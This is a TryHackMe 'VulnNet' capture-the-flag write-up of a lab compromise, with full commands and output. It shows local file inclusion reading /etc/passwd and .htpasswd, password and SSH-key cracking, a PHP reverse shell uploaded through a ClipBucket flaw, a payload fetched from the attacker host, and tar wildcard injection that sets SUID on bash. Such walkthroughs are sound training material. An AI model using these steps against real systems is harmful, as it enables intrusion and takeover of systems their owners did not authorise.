# VulnNet

**Date:** 22, May, 2021

**Author:** Dhilip Sanjay S

---

[Click Here](https://tryhackme.com/room/vulnnet1) to go to the TryHackMe room.

## Enumeration

- Add `vulnnet.thm` to the `/etc/hosts` file.

### Nmap

```bash
nmap -sC -sV -p- 10.10.215.172 -oN nmap.out
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 18:47 IST
Stats: 0:12:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 81.65% done; ETC: 19:02 (0:02:47 remaining)
Nmap scan report for 10.10.215.172
Host is up (0.15s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VulnNet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 908.61 seconds
```

### Gobuster

```bash
$ gobuster dir -u http://vulnnet.thm -t 50 -w /usr/share/wordlists/dirb/common.txt -x php,phtml,txt,js,html | tee gobuster.out
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://vulnnet.thm
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,phtml,txt,js,html
[+] Timeout:                 10s
===============================================================
2021/05/22 11:19:54 Starting gobuster in directory enumeration mode
===============================================================
/.hta.phtml           (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.htaccess.js         (Status: 403) [Size: 276]
/.hta.js              (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.htaccess.phtml      (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd.phtml      (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd.js         (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://vulnnet.thm/css/]
/fonts                (Status: 301) [Size: 310] [--> http://vulnnet.thm/fonts/]
/img                  (Status: 301) [Size: 308] [--> http://vulnnet.thm/img/]  
/index.php            (Status: 200) [Size: 5829]                               
/index.php            (Status: 200) [Size: 5829]                               
/js                   (Status: 301) [Size: 307] [--> http://vulnnet.thm/js/]   
/LICENSE.txt          (Status: 200) [Size: 1109]                               
/login.html           (Status: 200) [Size: 2479]                               
/server-status        (Status: 403) [Size: 276]                                
                                                                               
===============================================================
2021/05/22 11:21:36 Finished
===============================================================
```

![VulnNet Home](Images/vulnnet-home.png)

## Other Vhosts

- By analysing the `javascript` file:

```js
t.o = function(a, e) {
        return Object.prototype.hasOwnProperty.call(a, e)
    }, t.p = "http://broadcast.vulnnet.thm", t(t.s = 0)
```

- So, there must be another virtual host. So, added `broadcast.vulnnet.thm` to `/etc/hosts` file.
- But it requires authentication to access the page:

![VulnNet - Broadcast](Images/vulnnet-broadcast.png)

- By running `gobuster vhost`:

```bash
$ gobuster vhost -u http://vulnnet.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 | tee gobuster-vhost
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://vulnnet.thm
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/05/22 20:19:41 Starting gobuster in VHOST enumeration mode
===============================================================
Found: gc._msdcs.vulnnet.thm (Status: 400) [Size: 424]
Found: broadcast.vulnnet.thm (Status: 401) [Size: 468]
                                                      
===============================================================
2021/05/22 20:20:02 Finished
===============================================================
```

- Add `gc._msdcs.vulnnet.thm` to `/etc/hosts` file.
- But, we get **400 error** on that page too:

![VulnNet - gc._msdcs.vulnnet.thm](Images/vulnnet-gc_msdcs.png)

---

## Analysing JS files in vulnnet.thm

- By analysing JS files, we see that there is a **referer** parameter in the request.

```js
n.o = function(e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }, n.p = "http://vulnnet.thm/index.php?referer=", n(n.s = 0)
```

- So, I tried to include a remote url `?referer=http://broadcast.vulnnet.thm` in the referer parameter, which gave the same `index.php` as the output.

- By setting `?referer=login.html`, we get the **login.html** source code inside **index.php**:

![referer=login.html](Images/vulnnet-referer-login.png)

### Fetch /etc/passwd

- May be we can try to read local files by setting `?referer=/etc/passwd`, we get the **passwd** file inside **index.php**:

![Fetch /etc/passwd](Images/vulnnet-referer-passwd.png)

### Locating .htpasswd

- By setting `?referer=/etc/apache2/sites-enabled/000-default.conf` (default config) file, we get the location of **.htpasswd**:

![Locating .htpasswd](Images/vulnnet-locating-htpasswd.png)

### Fetch /etc/apache2/.htpasswd

- By setting `?referer=/etc/apache2/.htpasswd`, we get the some username and password hash:

![Locating .htpasswd](Images/vulnnet-htpasswd.png)

- May be they are credentials for **broadcast.vulnnet.thm**.

---

## Cracking the hash

- Use `hashcat` to crack the obtained hash:

```bash
$ hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz, 2884/2948 MB (1024 MB allocatable), 1MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

$apr1$REDACTED:REDACTED
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
Hash.Target......: $apr1$REDACTED
Time.Started.....: Sat May 22 21:34:44 2021 (10 mins, 50 secs)
Time.Estimated...: Sat May 22 21:45:34 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2778 H/s (16.86ms) @ Accel:48 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2169360/14344385 (15.12%)
Rejected.........: 0/2169360 (0.00%)
Restore.Point....: 2169312/14344385 (15.12%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidates.#1....: 997582 -> 99717913

Started: Sat May 22 21:34:14 2021
Stopped: Sat May 22 21:45:36 2021
```

- Using `developers:REDACTED`, we are able to access **broadcast.vulnnet.thm**.

![VulnNet - Clipbucket v4.0](Images/vulnnet-clipbucket.png)

---

## Gobuster on broadcast.vulnnet.thm

```bash
gobuster dir -u http://broadcast.vulnnet.thm -t 100 -w /usr/share/wordlists/dirb/big.txt -x php,phtml,js,txt -H 'Authorization: Basic REDACTED'
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://broadcast.vulnnet.thm
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              phtml,js,txt,php
[+] Timeout:                 10s
===============================================================
2021/05/22 23:41:10 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 286]
/.htaccess.phtml      (Status: 403) [Size: 286]
/.htaccess.js         (Status: 403) [Size: 286]
/.htaccess.txt        (Status: 403) [Size: 286]
/.htaccess.php        (Status: 403) [Size: 286]
/.htpasswd            (Status: 403) [Size: 286]
/.htpasswd.php        (Status: 403) [Size: 286]
/.htpasswd.phtml      (Status: 403) [Size: 286]
/.htpasswd.js         (Status: 403) [Size: 286]
/.htpasswd.txt        (Status: 403) [Size: 286]
/403.php              (Status: 200) [Size: 26627]
/404.php              (Status: 200) [Size: 26627]
/LICENSE              (Status: 200) [Size: 2588] 
/actions              (Status: 301) [Size: 332] [--> http://broadcast.vulnnet.thm/actions/]
/activation.php       (Status: 200) [Size: 26627]                                          
/admin_area           (Status: 301) [Size: 335] [--> http://broadcast.vulnnet.thm/admin_area/]
/ajax                 (Status: 301) [Size: 329] [--> http://broadcast.vulnnet.thm/ajax/]      
/ajax.php             (Status: 200) [Size: 26627]                                             
/api                  (Status: 301) [Size: 328] [--> http://broadcast.vulnnet.thm/api/]       
/cache                (Status: 301) [Size: 330] [--> http://broadcast.vulnnet.thm/cache/]     
/captcha.php          (Status: 200) [Size: 213]                                               
/channels.php         (Status: 200) [Size: 26627]                                             
/collections.php      (Status: 200) [Size: 26627]                                             
/contact.php          (Status: 200) [Size: 26627]                                             
/download.php         (Status: 200) [Size: 26627]                                             
/favicon.ico          (Status: 200) [Size: 3262]                                              
/files                (Status: 301) [Size: 330] [--> http://broadcast.vulnnet.thm/files/]     
/forgot.php           (Status: 200) [Size: 26627]                                             
/groups.php           (Status: 200) [Size: 26627]                                             
/images               (Status: 301) [Size: 331] [--> http://broadcast.vulnnet.thm/images/]    
/includes             (Status: 301) [Size: 333] [--> http://broadcast.vulnnet.thm/includes/]  
/index.php            (Status: 200) [Size: 27216]                                             
/js                   (Status: 301) [Size: 327] [--> http://broadcast.vulnnet.thm/js/]        
/logout.php           (Status: 200) [Size: 26627]                                             
/module.php           (Status: 200) [Size: 26627]                                             
/myaccount.php        (Status: 200) [Size: 26627]                                             
/opensearch.php       (Status: 200) [Size: 26627]                                             
/photos.php           (Status: 200) [Size: 26597]                                             
/plugins              (Status: 301) [Size: 332] [--> http://broadcast.vulnnet.thm/plugins/]   
/player               (Status: 301) [Size: 331] [--> http://broadcast.vulnnet.thm/player/]    
/privacy.php          (Status: 200) [Size: 26627]                                             
/readme               (Status: 200) [Size: 2968]                                              
/rss.php              (Status: 200) [Size: 26627]                                             
/search_result.php    (Status: 200) [Size: 26627]                                             
/server-status        (Status: 403) [Size: 286]                                               
/signup.php           (Status: 200) [Size: 26704]                                             
/sitemap.php          (Status: 200) [Size: 26627]                                             
/styles               (Status: 301) [Size: 331] [--> http://broadcast.vulnnet.thm/styles/]    
/upload.php           (Status: 200) [Size: 30962]                                             
/videos.php           (Status: 200) [Size: 26711]                                             
                                                                                              
===============================================================
2021/05/22 23:43:58 Finished
===============================================================
```

- Oof! Too many `php` files to check! And none of them were promising.
- **P.S**: I spent almost an hour looking through those php files :-(
- Once a wise man told me to check for **service exploits**. We'll check for clipbucket exploits in **searchsploit**:

```bash
$ searchsploit clipbucket 4.0
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection                 | php/webapps/44250.txt
ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection                 | php/webapps/44250.txt
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

$ searchsploit -m php/webapps/44250.txt
  Exploit: ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection
      URL: https://www.exploit-db.com/exploits/44250
     Path: /usr/share/exploitdb/exploits/php/webapps/44250.txt
File Type: ASCII text, with CRLF line terminators

$ cat 44250.txt
.
.
2. Unauthenticated Arbitrary File Upload
A malicious file can be uploaded into the webserver by an unauthenticated
attacker. It is possible for an attacker to upload a script to issue operating
system commands. This same vulnerability can also be exploited by an
authenticated attacker with normal user privileges.
.
.
2. Unauthenticated Arbitrary File Upload
Below is the cURL request to upload arbitrary files to the webserver with no
authentication required.

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/beats_uploader.php"

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/photo_uploader.php"
.
.
```

- Mmmmm, **Unauthenticated Arbitrary file Upload**. That's exactly what we want to upload reverse shell code!

---

## Initial Shell

### Upload Reverse Shell

- Copy the `php-reverse-shell.php` and change the IP address and Port.
- Now upload using the exploit code (just change the file name and Authorization header)
- **P.S**: This authorization header is for accessing `http://broadcast.vulnnet.thm`. It's not the authorization for clipbucket.

```bash
$ curl -F "file=@reverse.php" -F "plupload=1" -F "name=reverse.php" "http://broadcast.vulnnet.thm/actions/photo_uploader.php" -H "Authorization: Basic REDACTED"

{"success":"yes","file_name":"16217114086733f6","extension":"php","file_directory":"2021\/05\/22"}
```

### Capture & Upgrade the shell

- Listen on the appropriate port using netcat.
- Now visit `http://broadcast.vulnnet.thm/files/photos/2021/05/22/16217114086733f6.php` to get the reverse shell:

```bash
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.7.91] from (UNKNOWN) [10.10.45.2] 36056
Linux vulnnet 4.15.0-134-generic #138-Ubuntu SMP Fri Jan 15 10:52:18 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 21:25:44 up 14 min,  0 users,  load average: 0.25, 0.41, 0.38
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: cant access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- Upgrade the shell:

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@vulnnet:/$ export TERM=xterm
export TERM=xterm
www-data@vulnnet:/$ ^Z
[1]+  Stopped                 nc -lvnp 1234

root@kali:~/Desktop/CTF/TryHackMe/vulnnet# stty raw -echo; fg
nc -lvnp 1234

www-data@vulnnet:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


## Running Linpeas

- Download `linpeas.sh` on the target machine & execute it

```bash
www-data@vulnnet:/home$ cd /dev/shm
www-data@vulnnet:/dev/shm$ wget http://10.17.7.91:8000/linpeas.sh
--2021-05-22 21:33:19--  http://10.17.7.91:8000/linpeas.sh
Connecting to 10.17.7.91:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 339569 (332K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 331.61K   299KB/s    in 1.1s    

2021-05-22 21:33:20 (299 KB/s) - 'linpeas.sh' saved [339569/339569]

www-data@vulnnet:/dev/shm$ ls
linpeas.sh
www-data@vulnnet:/dev/shm$ chmod +x linpeas.sh
www-data@vulnnet:/dev/shm$ ./linpeas.sh | tee linpeas.out
```

- Linpeas gave away two things:
1. Cron job running a script `/var/opt/backupsrv.sh`:

  ```bash
  www-data@vulnnet:~$ cat /etc/crontab 
  # /etc/crontab: system-wide crontab
  # Unlike any other crontab you don't have to run the `crontab'
  # command to install the new version when you edit this file
  # and files in /etc/cron.d. These files also have username fields,
  # that none of the other crontabs do.

  SHELL=/bin/sh
  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

  # m h dom mon dow user  command
  */2   * * * *   root    /var/opt/backupsrv.sh
  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  ```
    
2. SSH backup of **server-management** user is inside `/var/backups/` directory:

  ```bash
  www-data@vulnnet:/dev/shm$ cd /var/backups/
  www-data@vulnnet:/var/backups$ ls -la
  total 2348
  .
  .
  -rw-------  1 root              root                  857 Jan 23 22:10 group.bak
  -rw-------  1 root              shadow                712 Jan 23 22:10 gshadow.bak
  -rw-------  1 root              root                 1831 Jan 23 16:00 passwd.bak
  -rw-------  1 root              shadow               1118 Jan 23 22:19 shadow.bak
  -rw-rw-r--  1 server-management server-management    1484 Jan 24 14:08 ssh-backup.tar.gz
  -rw-r--r--  1 root              root                49338 Jan 25 23:28 vulnnet-Monday.tgz
  -rw-r--r--  1 root              root                49338 May 22 21:52 vulnnet-Saturday.tgz
  ```

---

## Privilege Escalation (www-data to server-management)

### Obtaining the Private SSH Key

- Copying and extracting `ssh-backup.tar.gz`:

```bash
www-data@vulnnet:/var/backups$ cp ssh-backup.tar.gz /dev/shm/
www-data@vulnnet:/var/backups$ cd /dev/shm/
www-data@vulnnet:/dev/shm$ ls
linpeas.out  linpeas.sh  ssh-backup.tar.gz

www-data@vulnnet:/dev/shm$ tar -xvf ssh-backup.tar.gz 
id_rsa
www-data@vulnnet:/dev/shm$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6CE1A97A7DAB4829FE59CC561FB2CCC4

REDACTED
-----END RSA PRIVATE KEY-----
```

- Now we can SSH login using the private key.
- But unfortunately it's encrypted.

```bash
$ nano id_rsa
$ chmod 600 id_rsa 
$ ssh -i id_rsa server-management@vulnnet.thm 
Enter passphrase for key 'id_rsa': 
```

### Bruteforcing the passphrase

- Bruteforce the passphrase using `ssh2john` and `john`:

```bash
$ python3 /usr/share/john/ssh2john.py id_rsa > forjohn.txt

$ john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status

REDACTED     (id_rsa)

1g 0:00:00:08 81.52% (ETA: 01:30:26) 0.1128g/s 1317Kp/s 1317Kc/s 1317KC/s 90414
Session aborted
```

---

## User.txt

- Now we have the **SSH Private Key** and the **passphrase**.
- Login into the target machine as `server-management` user:

```bash
ssh -i id_rsa server-management@vulnnet.thm 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing self-healing high availability clusters in MicroK8s.
   Simple, hardened, Kubernetes for production, from RaspberryPi to DC.

     https://microk8s.io/high-availability

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

560 packages can be updated.
359 updates are security updates.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

server-management@vulnnet:~$ id
uid=1000(server-management) gid=1000(server-management) groups=1000(server-management)
```

- Cat the **user.txt** file:

```bash
server-management@vulnnet:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos

server-management@vulnnet:~$ hostname && whoami && cat user.txt
vulnnet
server-management
THM{REDACTED}
```

![VulnNet - User](Images/vulnnet-user.png)

---

## Privilege Escalation (server-management to root)

### Cron Job - script

- Cat the script file `/var/opt/backupsrv.sh` executed as **root** user in the crontab.

```bash
server-management@vulnnet:~$ cat /var/opt/backupsrv.sh 
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
server-manage
```

- It's copying the files inside `/home/server-management/Documents` directory (**with a wildcard match**) and saving it as `.tgz` file in the `/var/backups` directory.
- Initially I tried to do **path hijacking** and was fumbling around!
- Finally got this: [Tar - Execute arbitrary commands](https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks#tar)


### Exploiting tar

- Insert malicious code into `exploit.sh` and also the arbitrary command execution payload!
- Malicious code:
  - `chmod +s /bin/bash` (or)
  - `echo "server-management ALL=(root) NOPASSWD: ALL" > /etc/sudoers`

```bash
server-management@vulnnet:/$ cd ~/Documents/
server-management@vulnnet:~/Documents$ echo "chmod +s /bin/bash" > exploit.sh

server-management@vulnnet:~/Documents$ echo "" > "--checkpoint=1"
server-management@vulnnet:~/Documents$ echo "" > "--checkpoint-action=exec=sh exploit.sh"
```

- Wait for 2 mins for the cron job to execute the script!

---

## Root.txt

- Check if the permissions on `/bin/bash` have changed.
- Once the **SUID bit** is set, you can run `/bin/bash -p` to become root!

```bash
server-management@vulnnet:~$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash

server-management@vulnnet:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1113504 Apr  4  2018 /bin/bash

server-management@vulnnet:~$ /bin/bash -p
bash-4.4# whoami
root
```

- Cat the **root.txt** file:

```bash
bash-4.4# cd /root/
bash-4.4# ls 
root.txt

bash-4.4# hostname && whoami && cat root.txt 
vulnnet
root
THM{REDACTED}
```

![VulnNet - Root](Images/vulnnet-root.png)

---

## References
- [Tar - Execute arbitrary commands](https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks#tar)